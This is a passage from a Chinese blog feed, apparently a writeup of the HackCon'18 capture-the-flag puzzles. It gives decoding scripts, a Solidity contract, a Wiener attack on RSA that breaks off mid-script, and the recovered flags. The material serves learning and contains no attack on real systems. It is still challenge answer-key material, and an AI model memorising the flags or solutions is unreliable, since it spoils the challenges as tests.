title="总结"></a>总结</h3><p>对于每一个安全问题而言，不鸣风平浪静，一鸣灰飞烟灭。此次比赛，说实话，渗透方面不算难，甚至简单，但是非常考察一名优秀的白帽子的夯实的基础能力，对协议的深刻理解、面对突发事件的应急思维和处理能力、熟悉不同操作系统命令行方式下的操作、代码执行能力等等。基础的确很重要。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;有幸参加了某省首届工控安全大赛，学到了很多，发现了一些作为&lt;code&gt;web&lt;/code&gt;狗的底层缺陷，谈谈此次比赛的体验。&lt;/p&gt;
    
    </summary>
    
    
      <category term="线下赛事" scheme="https://jianghuxia.github.io/tags/%E7%BA%BF%E4%B8%8B%E8%B5%9B%E4%BA%8B/"/>
    
  </entry>
  
  <entry>
    <title>Hackon18 writeup</title>
    <link href="https://jianghuxia.github.io/2018/08/21/Hackon18-writeup/"/>
    <id>https://jianghuxia.github.io/2018/08/21/Hackon18-writeup/</id>
    <published>2018-08-21T14:01:03.000Z</published>
    <updated>2018-08-25T14:43:29.523Z</updated>
    
    <content type="html"><![CDATA[<p>人懒，懒得重新写writeup，写了一些觉得蛮不错的点，其中几题借鉴了下<a href="http://yocchin.hatenablog.com/entry/2018/08/19/202100" target="_blank" rel="noopener">大佬</a>的。</p><a id="more"></a> <h3 id="Hackon18"><a href="#Hackon18" class="headerlink" title="Hackon18"></a>Hackon18</h3><h4 id="Junior-Facche"><a href="#Junior-Facche" class="headerlink" title="Junior/Facche"></a>Junior/Facche</h4><h5 id="Junior-Facche-Salad-Upgrades"><a href="#Junior-Facche-Salad-Upgrades" class="headerlink" title="Junior/Facche_Salad Upgrades"></a>Junior/Facche_Salad Upgrades</h5><p><img src="/2018/08/21/Hackon18-writeup/1534834664974.png" alt="1534834664974"></p><p>给出字符串 <code>e4uo{zo1b_1e_f0j4l10i}z0ce</code> </p><p>这个还是稍微有点特殊，每个字母的偏移量是在这个字符串的第几位，脚本解一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">chars = string.lowercase</span><br><span class="line"></span><br><span class="line">enc = <span class="string">'e4uo&#123;zo1b_1e_f0j4l10i&#125;z0ce'</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)):</span><br><span class="line">    <span class="keyword">if</span> enc[i] <span class="keyword">in</span> chars:</span><br><span class="line">        flag += chars[(chars.index(enc[i]) - (i + <span class="number">1</span>)) % len(chars)]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += enc[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>得到答案<code>d4rk{th1s_1s_r0t4t10n}c0de</code></p><h4 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h4><h5 id="Misc-EtherHide"><a href="#Misc-EtherHide" class="headerlink" title="Misc_EtherHide"></a>Misc_EtherHide</h5><p><img src="/2018/08/21/Hackon18-writeup/1534814487604.png" alt="1534814487604"></p><p>打开<code>MyStorage.sol</code>有以下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">contract MyStorage</span><br><span class="line">&#123;</span><br><span class="line">address public owner;</span><br><span class="line">address public previous_owner;</span><br><span class="line">address public creator;</span><br><span class="line">bytes32 public dataHash;</span><br><span class="line"></span><br><span class="line">constructor() public</span><br><span class="line">&#123;</span><br><span class="line">owner = msg.sender;</span><br><span class="line">creator = msg.sender;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function withdraw() public</span><br><span class="line">&#123;</span><br><span class="line">require(address(this).balance &gt; 0);</span><br><span class="line"></span><br><span class="line">if(address(this).balance &gt; 1 ether)</span><br><span class="line">&#123;</span><br><span class="line">previous_owner.transfer(address(this).balance - 1 ether);</span><br><span class="line">&#125;</span><br><span class="line">creator.transfer(address(this).balance);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function change_data(string data) public payable</span><br><span class="line">&#123;</span><br><span class="line">require(msg.sender == owner);</span><br><span class="line">require(msg.value &gt; 0.5 ether);</span><br><span class="line"></span><br><span class="line">dataHash = keccak256(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function check_data(string data) public payable returns (bool)</span><br><span class="line">&#123;</span><br><span class="line">require(msg.value &gt; address(this).balance - msg.value);</span><br><span class="line">require(msg.sender == owner);</span><br><span class="line">require(keccak256(data) == dataHash);</span><br><span class="line"></span><br><span class="line">previous_owner = owner;</span><br><span class="line">owner = msg.sender;</span><br><span class="line"></span><br><span class="line">return true;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看不懂没关系，题目给了</p><ol><li>Network : <code>Ropsten Test Network</code> </li><li>Contract Address : <code>0x94f23F189583e828E73573905A19d93E21D0E957</code> </li></ol><p>根据第一个提示，谷歌一波发现网址：<code>https://ropsten.etherscan.io/</code>，这是个此题以太坊的工作站点</p><p>第二个提示告诉合同地址，于是打开网页<code>https://ropsten.etherscan.io/address/0x94f23F189583e828E73573905A19d93E21D0E957</code></p><p>其中翻阅下，会找到一个<img src="/2018/08/21/Hackon18-writeup/1534814824681.png" alt="1534814824681"></p><p>打开，Input Data中的数据，winhex打开，16进制转ASCII，得到答案</p><p><img src="/2018/08/21/Hackon18-writeup/1534814869252.png" alt="1534814869252"></p><p><img src="/2018/08/21/Hackon18-writeup/1534815028444.png" alt="1534815028444"></p><h5 id="Misc-CryptoRevSalad"><a href="#Misc-CryptoRevSalad" class="headerlink" title="Misc_CryptoRevSalad"></a>Misc_CryptoRevSalad</h5><p><img src="/2018/08/21/Hackon18-writeup/1534836115752.png" alt="1534836115752"></p><p>这题做的有点难受，给了个数据包，三板斧分析，简单分析了下</p><p>tcp流3是明文字符，给了以下信息</p><p><img src="/2018/08/21/Hackon18-writeup/1534836214809.png" alt="1534836214809"></p><p><img src="/2018/08/21/Hackon18-writeup/1534836236207.png" alt="1534836236207"></p><p>再看看tcp流5</p><p><img src="/2018/08/21/Hackon18-writeup/1534836261667.png" alt="1534836261667"></p><p>看到有种熟悉的感觉，实际上就是个<code>zip</code>的<code>16</code>进制，不过是每个字节颠倒的，把这个保存为<code>zip.txt</code>，代码操作一番</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#-*—coding:utf-8</span><br><span class="line"></span><br><span class="line">str_hex=&apos;&apos;</span><br><span class="line">with open(&quot;zip.txt&quot;,&apos;r&apos;) as line:</span><br><span class="line">    for i in line:</span><br><span class="line">        s1=i[:-1].split(&quot; &quot;)</span><br><span class="line">        print s1[1:]</span><br><span class="line">        for j in s1[1:]:</span><br><span class="line">            print j</span><br><span class="line">            str_hex+=j[2]+j[3]+j[0]+j[1]</span><br><span class="line"></span><br><span class="line">print str_hex</span><br></pre></td></tr></table></figure><p>得到结果，复制到<code>winhex</code>里，保存<code>zip.zip</code>文件，打开，发现个<code>ELF</code>文件，有的玩</p><p><img src="/2018/08/21/Hackon18-writeup/1534836427192.png" alt="1534836427192"></p><p><img src="/2018/08/21/Hackon18-writeup/1534836482998.png" alt="1534836482998"></p><p>此题有待研究，期待待续咯！！！</p><p>补：发现<a href="https://ctftime.org/writeup/10806" target="_blank" rel="noopener">此题writeup</a>，后面完善</p><h4 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h4><h5 id="Crypto-Diversity"><a href="#Crypto-Diversity" class="headerlink" title="Crypto_Diversity"></a>Crypto_Diversity</h5><p><img src="/2018/08/21/Hackon18-writeup/1534815294218.png" alt="1534815294218"></p><p>复制下</p><p><code>b1001000 x69 d33 d32 o127 b1100101 o154 o143 b1101111 o155 o145 d32 o164 d111 d32 x48 b1100001 x63 o153 b1000011 o157 x6e d39 o61 b111000 x2c d32 d111 b1110010 d103 d97 x6e o151 x73 d101 d100 o40 d97 b1110011 b100000 x70 o141 o162 x74 d32 x6f x66 b100000 o105 b1110011 x79 b1100001 d39 d49 b111000 x20 b1100010 d121 b100000 x49 o111 b1001001 x54 b100000 b1000100 x65 x6c o150 x69 b101110 x20 o111 d110 b100000 o143 d97 d115 o145 o40 b1111001 b1101111 x75 b100111 x72 x65 x20 x73 x65 b1100101 b1101011 x69 o156 x67 d32 b1100001 o40 o162 x65 o167 b1100001 o162 o144 d32 x66 d111 x72 b100000 o171 x6f d117 b1110010 o40 d101 x66 x66 x6f x72 d116 o163 x2c b100000 d104 b1100101 d114 o145 x27 d115 x20 b1100001 d32 d102 d108 b1100001 x67 x20 x3a b100000 o144 x34 o162 x6b x7b o151 d95 d87 o151 x73 b100011 d95 x41 o61 x6c d95 b1110100 d52 d115 b1101011 d53 o137 o167 x33 d114 o63 o137 d116 b1101000 o151 o65 x5f x33 d52 o65 o171 o137 x58 b1000100 b1000100 b1111101 x63 d48 d100 d101 d46 b100000 o101 x6e b1111001 d119 b1100001 b1111001 x73 b101100 x20 o150 d111 b1110000 b1100101 o40 x79 o157 d117 b100000 b1101000 o141 x76 x65 b100000 d97 x20 o147 d111 b1101111 d100 b100000 b1110100 b1101001 d109 b1100101 d32 x3b x29</code></p><p>观察到<code>x</code>、<code>b</code>、<code>d</code>、<code>o</code>字样，估计就是进制之间的转化，然后转成<code>ASCII</code>码对应的字符。写个脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#-*-coding:utf-8</span><br><span class="line"></span><br><span class="line">Str_text=&apos;&apos;&apos;b1001000 x69 d33 d32 o127 b1100101 o154 o143 b1101111 o155 o145 d32 o164 d111 d32 x48 b1100001 x63 o153 b1000011 o157 x6e d39 o61 b111000 x2c d32 d111 b1110010 d103 d97 x6e o151 x73 d101 d100 o40 d97 b1110011 b100000 x70 o141 o162 x74 d32 x6f x66 b100000 o105 b1110011 x79 b1100001 d39 d49 b111000 x20 b1100010 d121 b100000 x49 o111 b1001001 x54 b100000 b1000100 x65 x6c o150 x69 b101110 x20 o111 d110 b100000 o143 d97 d115 o145 o40 b1111001 b1101111 x75 b100111 x72 x65 x20 x73 x65 b1100101 b1101011 x69 o156 x67 d32 b1100001 o40 o162 x65 o167 b1100001 o162 o144 d32 x66 d111 x72 b100000 o171 x6f d117 b1110010 o40 d101 x66 x66 x6f x72 d116 o163 x2c b100000 d104 b1100101 d114 o145 x27 d115 x20 b1100001 d32 d102 d108 b1100001 x67 x20 x3a b100000 o144 x34 o162 x6b x7b o151 d95 d87 o151 x73 b100011 d95 x41 o61 x6c d95 b1110100 d52 d115 b1101011 d53 o137 o167 x33 d114 o63 o137 d116 b1101000 o151 o65 x5f x33 d52 o65 o171 o137 x58 b1000100 b1000100 b1111101 x63 d48 d100 d101 d46 b100000 o101 x6e b1111001 d119 b1100001 b1111001 x73 b101100 x20 o150 d111 b1110000 b1100101 o40 x79 o157 d117 b100000 b1101000 o141 x76 x65 b100000 d97 x20 o147 d111 b1101111 d100 b100000 b1110100 b1101001 d109 b1100101 d32 x3b x29</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">codes=Str_text[:-1].split(&quot; &quot;)</span><br><span class="line">ans = [int(&apos;0&#123;&#125;&apos;.format(e), 0) if e[0] != &apos;d&apos; else int(e[1:]) for e in codes]</span><br><span class="line">#print ans</span><br><span class="line">ans = [chr(e) for e in ans]</span><br><span class="line">print(&apos;&apos;.join(ans))</span><br></pre></td></tr></table></figure><p>输出结果</p><p><code>Hi! Welcome to HackCon&#39;18, organised as part of Esya&#39;18 by IIIT Delhi. In case you&#39;re seeking a reward for your efforts, here&#39;s a flag : d4rk{i_Wis#_A1l_t4sk5_w3r3_thi5_345y_XDD}c0de. Anyways, hope you have a good time ;)</code></p><h5 id="Crypto-Light-N’-Easy"><a href="#Crypto-Light-N’-Easy" class="headerlink" title="Crypto_Light N’ Easy"></a>Crypto_Light N’ Easy</h5><p><img src="/2018/08/21/Hackon18-writeup/1534815385349.png" alt="1534815385349"></p><p>题目内容：</p><p><code>01001110-00100000-00111010-00001100-11011110-00011110-00000000-01100000-00101010-01111010-00100000-11110110-00111010-00000000-11111110-00001100-00111000-11011110-00000000-10111100-00001010-11011110-11011110-00101010-00000000-01110110-11011110-00001100-00001100-00111010-01010110-00000000-11111100-00001010-11111010-00101010-11110110-11011110-00000000-11101110-11011110-01111011-00000000-10001110-00001100-11111010-11110110-00000000-00100000-10110110-00000000-00011101-10011111-01111011-10110111-11111110-00001010-00100000-00101010-11110111-01111000-00111010-01100111-10001100-00111011-10101010-11011110</code></p><p><code>hint.jpg</code></p><p><img src="/2018/08/21/Hackon18-writeup/1534859951316.png" alt="1534859951316"></p><p>下意识二进制转化，然后发现错了，国外网站搜索一波</p><p><img src="/2018/08/21/Hackon18-writeup/1534819686004.png" alt="1534819686004"></p><p>嗯，很像对吧，然后学习了下<code>https://www.wikiwand.com/de/Segmentanzeige</code></p><p>其实每个8位的值都是按以下字母的顺序对应的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   b</span><br><span class="line">  ===</span><br><span class="line">a| g |c</span><br><span class="line">  ===</span><br><span class="line">f|   |d</span><br><span class="line">  ===   .h (the dot)</span><br><span class="line">   e</span><br></pre></td></tr></table></figure><p>写个脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">enc = &apos;01001110-00100000-00111010-00001100-11011110-00011110-00000000-01100000-00101010-01111010-00100000-11110110-00111010-00000000-11111110-00001100-00111000-11011110-00000000-10111100-00001010-11011110-11011110-00101010-00000000-01110110-11011110-00001100-00001100-00111010-01010110-00000000-11111100-00001010-11111010-00101010-11110110-11011110-00000000-11101110-11011110-01111011-00000000-10001110-00001100-11111010-11110110-00000000-00100000-10110110-00000000-00011101-10011111-01111011-10110111-11111110-00001010-00100000-00101010-11110111-01111000-00111010-01100111-10001100-00111011-10101010-11011110&apos;</span><br><span class="line">codes = enc.split(&apos;-&apos;)</span><br><span class="line"></span><br><span class="line">line1 = &apos;&apos;</span><br><span class="line">for code in codes:</span><br><span class="line">    if code[0] == &apos;1&apos;:</span><br><span class="line">        line1 += &apos; _  &apos;</span><br><span class="line">    else:</span><br><span class="line">        line1 += &apos;    &apos;</span><br><span class="line"></span><br><span class="line">line2 = &apos;&apos;</span><br><span class="line">for code in codes:</span><br><span class="line">    if code[5] == &apos;1&apos;:</span><br><span class="line">        line2 += &apos;|&apos;</span><br><span class="line">    else:</span><br><span class="line">        line2 += &apos; &apos;</span><br><span class="line">    if code[6] == &apos;1&apos;:</span><br><span class="line">        line2 += &apos;_&apos;</span><br><span class="line">    else:</span><br><span class="line">        line2 += &apos; &apos;</span><br><span class="line">    if code[1] == &apos;1&apos;:</span><br><span class="line">        line2 += &apos;|&apos;</span><br><span class="line">    else:</span><br><span class="line">        line2 += &apos; &apos;</span><br><span class="line">    line2 += &apos; &apos;</span><br><span class="line"></span><br><span class="line">line3 = &apos;&apos;</span><br><span class="line">for code in codes:</span><br><span class="line"></span><br><span class="line">    if code[4] == &apos;1&apos;:</span><br><span class="line">        line3 += &apos;|&apos;</span><br><span class="line">    else:</span><br><span class="line">        line3 += &apos; &apos;</span><br><span class="line">    if code[3] == &apos;1&apos;:</span><br><span class="line">        line3 += &apos;_&apos;</span><br><span class="line">    else:</span><br><span class="line">        line3 += &apos; &apos;</span><br><span class="line">    if code[2] == &apos;1&apos;:</span><br><span class="line">        line3 += &apos;|&apos;</span><br><span class="line">    else:</span><br><span class="line">        line3 += &apos; &apos;</span><br><span class="line">    if code[7] == &apos;1&apos;:</span><br><span class="line">        line3 += &apos;.&apos;</span><br><span class="line">    else:</span><br><span class="line">        line3 += &apos; &apos;</span><br><span class="line"></span><br><span class="line">flag = line1 + &apos;\n&apos; + line2 + &apos;\n&apos; + line3</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><p>运行得到结果</p><p><img src="/2018/08/21/Hackon18-writeup/1534820313181.png" alt="1534820313181"></p><p>最后结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d4rk&#123;L.E.d.s.Bring.Joy.To.me&#125;c0de</span><br></pre></td></tr></table></figure><h5 id="Crypto-Ron-Adi-and-Leonard"><a href="#Crypto-Ron-Adi-and-Leonard" class="headerlink" title="Crypto_Ron, Adi and Leonard"></a>Crypto_Ron, Adi and Leonard</h5><p><img src="/2018/08/21/Hackon18-writeup/1534815637585.png" alt="1534815637585"></p><p><code>rsa.txt</code>内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">n = 744818955050534464823866087257532356968231824820271085207879949998948199709147121321290553099733152323288251591199926821010868081248668951049658913424473469563234265317502534369961636698778949885321284313747952124526309774208636874553139856631170172521493735303157992414728027248540362231668996541750186125327789044965306612074232604373780686285181122911537441192943073310204209086616936360770367059427862743272542535703406418700365566693954029683680217414854103</span><br><span class="line"></span><br><span class="line">e = 57595780582988797422250554495450258341283036312290233089677435648298040662780680840440367886540630330262961400339569961467848933132138886193931053170732881768402173651699826215256813839287157821765771634896183026173084615451076310999329120859080878365701402596570941770905755711526708704996817430012923885310126572767854017353205940605301573014555030099067727738540219598443066483590687404131524809345134371422575152698769519371943813733026109708642159828957941</span><br><span class="line"></span><br><span class="line">c = 305357304207903396563769252433798942116307601421155386799392591523875547772911646596463903009990423488430360340024642675941752455429625701977714941340413671092668556558724798890298527900305625979817567613711275466463556061436226589272364057532769439646178423063839292884115912035826709340674104581566501467826782079168130132642114128193813051474106526430253192254354664739229317787919578462780984845602892238745777946945435746719940312122109575086522598667077632</span><br></pre></td></tr></table></figure><p>会发现<code>e</code>贼大，好的<code>Winner</code>爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DevContinuedFraction</span><span class="params">(num, denum)</span>:</span></span><br><span class="line">    partialQuotients = []</span><br><span class="line">    divisionRests = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(math.log(denum, <span class="number">2</span>))):</span><br><span class="line">        divisionRests = num % denum</span><br><span class="line">        partialQuotients.append(num / denum)</span><br><span class="line">        num = denum</span><br><span class="line">        denum = divisionRests</span><br><span class="line">        <span class="keyword">if</span> denum == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> partialQuotients</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DivergentsComputation</span><span class="params">(partialQuotients)</span>:</span></span><br><span class="line">    (p1, p2, q1, q2) = (<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    convergentsList = []</span><br><span class="line">    <span class="keyword">for</span> q <span class="keyword">in</span> partialQuotients:</span><br><span class="line">        pn = q * p1 + p2</span><br><span class="line">        qn = q * q1 + q2</span><br><span class="line">        convergentsList.append([pn, qn])</span><br><span class="line">        p2 = p1</span><br><span class="line">        q2 = q1</span><br><span class="line">        p1 = pn</span><br><span class="line">        q1 = qn</span><br><span class="line">    <span class="keyword">return</span> convergentsList</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SquareAndMultiply</span><span class="params">(base,exponent,modulus)</span>:</span></span><br><span class="line">    binaryExponent = []</span><br><span class="line">    <span class="keyword">while</span> exponent != <span class="number">0</span>:</span><br><span class="line">        binaryExponent.append(exponent % <span class="number">2</span>)</span><br><span class="line">        exponent = exponent / <span class="number">2</span></span><br><span class="line">    result = <span class="number">1</span></span><br><span class="line">    binaryExponent.reverse()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> binaryExponent:</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            result = (result * result) % modulus</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result = (result * result * base) % modulus</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">WienerAttack</span><span class="params">(e, n, c)</span>:</span></span><br><span class="line">    testStr = <span class="number">42</span></span><br><span class="line">    c = SquareAndMultiply(testStr, e, n)</span><br><span class="line">    <span class="keyword">for</span> C <span class="keyword">in</span> DivergentsComputation(DevContinuedFraction(e, n)) :</span><br><span class="line">        <span class="keyword">if</span> SquareAndMultiply(c, C[<span class="number">1</span>], n) == testStr :</span><br><span class="line">            FullReverse(n, e, C)</span><br><span class="line">            <span class="keyword">return</span> C[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetTheFlag</span><span class="params">(c, n, d)</span> :</span></span><br><span class="line">    p = pow(c, d, n)</span><br><span class="line">    size = len(<span class="string">'&#123;:02x&#125;'</span>.format(p)) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">''</span>.join([chr((p &gt;&gt; j) &amp; <span class="number">0xff</span>) <span class="keyword">for</span> j <span class="keyword">in</span> reversed(range(<span class="number">0</span>, size &lt;&lt; <span class="number">3</span>, <span class="number">8</span>))])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_invpow</span><span class="params">(x, n)</span>:</span></span><br><span class="line">    high = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> high ** n &lt; x:</span><br><span class="line">        high *= <span class="number">2</span></span><br><span class="line">    low = high / <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> low &lt; mid <span class="keyword">and</span> mid ** n &lt; x:</span><br><span class="line">            low = mid</span><br><span class="line">        <span class="keyword">elif</span> high &gt; mid <span class="keyword">and</span> mid ** n &gt; x:</span><br><span class="line">            high = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> mid</span><br><span class="line">    <span class="keyword">return</span> mid + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FullReverse</span><span class="params">(n, e, c)</span> :</span></span><br><span class="line">    phi = (e * c[<span class="number">1</span>] - <span class="number">1</span>) // c[<span class="number">0</span>]</span><br><span class="line">    a = <span class="number">1</span></span><br><span class="line">    b = -(n - phi + <span class="number">1</span>)</span><br><span class="line">    c = n</span><br><span class="line">    delta = b * b - <span class="number">4</span> * a * c</span><br><span class="line">    <span class="keyword">if</span> delta &gt; <span class="number">0</span> :</span><br><span class="line">        x1 = (- b + find_invpow((b * b - <span class="number">4</span> * a * c), <span class="number">2</span>)) / (<span class="number">2</span> * a)</span><br><span class="line">        x2 = (- b - find_invpow((b * b - <span class="number">4</span> * a * c), <span class="number">2</span>)) / (<span class="number">2</span> * a)</span><br><span class="line">        <span class="keyword">if</span> x1 * x2 == n:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'p = '</span> + str(x1)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'q = '</span> + str(x2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    n = <span class="number">744818955050534464823866087257532356968231824820271085207879949998948199709147121321290553099733152323288251591199926821010868081248668951049658913424473469563234265317502534369961636698778949885321284313747952124526309774208636874553139856631170172521493735303157992414728027248540362231668996541750186125327789044965306612074232604373780686285181122911537441192943073310204209086616936360770367059427862743272542535703406418700365566693954029683680217414854103</span></span><br><span class="line"></span><br><span class="line">    e = <span class="number">57595780582988797422250554495450258341283036312290233089677435648298040662780680840440367886540630330262961400339569961467848933132138886193931053170732881768402173651699826215256813839287157821765771634896183026173084615451076310999329120859080878365701402596570941770905755711526708704996817430012923885310126572767854017353205940605301573014555030099067727738540219598443066483590687404131524809345134371422575152698769519371943813733026109708642159828957941</span></span><br><span class="line"></span><br><span class="line">    c = <span 